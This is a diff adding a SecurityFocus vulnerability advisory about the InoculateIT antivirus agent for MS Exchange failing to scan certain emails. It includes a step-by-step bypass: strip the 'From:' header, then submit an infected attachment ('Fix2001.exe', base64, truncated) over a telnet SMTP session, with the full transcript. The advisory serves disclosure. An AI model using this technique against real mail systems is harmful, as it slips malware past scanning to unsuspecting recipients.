@@ -1,0 +1,78 @@
+source : http://www.securityfocus.com/bid/1935/info
+
+InoculateIT 4.52 is a popular antivirus agent for Microsoft Exchange Servers.
+
+A vulnerability exists in the InoculateIT Agent for MS Exchange that can allow a local attacker to pass a virus through both the agent and MS Exchange Server. There are reportedly numerous methods by which this can be accomplished, one of which is to remove the "From:" field in a infected message (MIME attachment included) and submit the message to the Exchange server. The Inoculate Agent will not detect the infected file when it is submitted in this manner. 
+
+If different organizations are using MS Exchange Server and InoculateIT Agents (with MS IMC being used to send the messages) the following vulnerabilities can exist:
+
+If a message is sent with only an infected file in the body of the message and no text, the Inoculate IT Agents will not detect the virus.
+
+If a message contains embedded characters and an infected attachment, InoculateIT will not open the attachment for scanning.
+
+InoculateIT only scans for messages destined for an Inbox folder. If a ruleset exists on the server whereby messages are directed to another mailbox, an infected file can bypass virus scanning.
+
+1. Get a message containing any infected attached MIME encoded file. I
+simply filtered out via EX to C:\TurfDir sending from outside to EX;
+
+2. Edit the file (I used MS Notepad.exe) and just remove the "From:
+..." line from the SMTP header. Something like this:
+
+Remove this line: From: Test <Test@abc.com.br>
+To: Joe Bob <jbob@xyz.com.br>
+Subject: Test
+Date: Mon, 23 Oct 2000 10:59:53 -0200
+MIME-Version: 1.0
+X-Mailer: Internet Mail Service (5.5.2650.21)
+Content-Type: application/x-msdownload;
+name=3D"Fix2001.exe"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+filename=3D"Fix2001.exe"
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAsAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g
+aW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABjDAXbJ21riCdta4gnbWuIJ21riGRta4ikcWWIJm
+1riFJpY2gnbWuIAAAAAAAAAABQRQAATAEDAJ/L0zcAAAAAAAAAAOAADwELAQUMABoAAAAA
+AgAAAAAAABAAAAAQAAAAMAAA... 
+
+3. Copy the Notepad content to clipboard;
+
+4. Issue "telnet your_exsrvr 25" command:
+
+220 aaa.xyz.com.br ESMTP Server (Microsoft Exchange Internet Mail
+Service 5.5.2650.21) ready
+helo
+250 OK
+mail from:<>
+250 OK - mail from <>
+rcpt to:<jbob@xyz.com.br>
+250 OK - Recipient <jbob@xyz.com.br>
+data
+354 Send data. End with CRLF.CRLF
+
+Here, paste from clipboard (Win2K, just a mouse right-click).
+Something like this:
+
+To: Joe Bob <jbob@xyz.com.br>
+Subject: Test
+Date: Mon, 23 Oct 2000 10:59:53 -0200
+MIME-Version: 1.0
+X-Mailer: Internet Mail Service (5.5.2650.21)
+Content-Type: application/x-msdownload;
+name=3D"Fix2001.exe"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+filename=3D"Fix2001.exe"
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAsAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g
+aW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABjDAXbJ21riCdta4gnbWuIJ21riGRta4ikcWWIJm
+1riFJpY2gnbWuIAAAAAAAAAABQRQAATAEDAJ/L0zcAAAAAAAAAAOAADwELAQUMABoAAAAA
+AgAAAAAAABAAAAAQAAAAMAAA... 
+
+250 OK
+quit
+221 closing connection
+
+5. Message sent, CA's Agent will not detect the infected file.
